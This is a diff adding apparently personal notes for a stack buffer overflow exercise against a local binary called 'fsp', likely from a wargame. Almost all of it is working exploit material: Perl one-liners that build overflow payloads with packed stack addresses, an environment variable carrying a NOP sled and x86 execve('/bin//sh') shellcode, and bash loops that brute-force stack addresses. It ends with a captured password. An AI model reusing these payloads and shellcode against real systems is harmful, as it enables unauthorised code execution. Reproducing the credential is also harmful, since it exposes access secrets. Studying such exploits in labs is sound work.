@@ -1,0 +1,24 @@
+//temp strings
+0xbffffa10:	 "acaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaa"
+
+gdb --args ~/fsp $(perl -e 'print "A",pack("I", 0xbfffced0)x(1041/4+10)')
+//
+payload
+export fsp=$(perl -e 'print "A"x5,pack("I",0xbffeb108-16)x19,"c"x6,pack("I",0xbfffe22b)x((2048-79-800-956+954)/4),"B"x(800-2)')
+
+export EGG=$(perl -e 'print "AA",pack("I", 0xbffffb83-1024)x2048,"\x90"x(10000 - 2048*4 -14),"1\xc0Ph//shh/bin\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80j\x01X1\xdb\xcd\x80"')
+
+
+
+for i in {1..1000}; do export x=`perl -e 'print "a"x'$i`; ~/fsp $(perl -e 'print "A",pack("I", 0xbfffced0)x(1041/4+10)') ; done 
+
+//bruteforcing stack addrs
+//-
+for i in {1..1000}; do export x=`perl -e 'print "a"x'$i`; export fsp=$(perl -e 'print "A"x5,pack("I",0xbffeb108-16)x19,"c"x6,pack("I",0xbfffe22b)x((2048-79-800-956+954)/4),"B"x(800-2)'); export EGG=$(perl -e 'print "AA",pack("I", 0xbffffb83-1024)x2048,"\x90"x(10000 - 2048*4 -14),"1\xc0Ph//shh/bin\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80j\x01X1\xdb\xcd\x80"'); ~/fsp $(perl -e 'print "A",pack("I", 0xbfffced0)x(1041/4+10)') ; done 
+//+
+for i in {1..1000}; do export fsp=$(perl -e 'print "A"x5,pack("I",0xbffeb108-16)x19,"c"x6,pack("I",0xbfffe22b)x((2048-79-800-956+954)/4),"B"x(800-2)'); export EGG=$(perl -e 'print "AA",pack("I", 0xbffffb83-1024)x2048,"\x90"x(10000 - 2048*4 -14),"1\xc0Ph//shh/bin\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80j\x01X1\xdb\xcd\x80"'); export x=`perl -e 'print "a"x'$i`; ~/fsp $(perl -e 'print "A",pack("I", 0xbfffced0)x(1041/4+10)') ; done 
+//-
+for i in {1..1000}; do export fsp=$(perl -e 'print "A"x5,pack("I",0xbffeb108-16)x19,"c"x6,pack("I",0xbfffe22b)x((2048-79-800-956+954)/4),"B"x(800-2)'); export x=`perl -e 'print "a"x'$i`; export EGG=$(perl -e 'print "AA",pack("I", 0xbffffb83-1024)x2048,"\x90"x(10000 - 2048*4 -14),"1\xc0Ph//shh/bin\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80j\x01X1\xdb\xcd\x80"'); ~/fsp $(perl -e 'print "A",pack("I", 0xbfffced0)x(1041/4+10)') ; done
+
+PASSWORD:
+$m4shitup
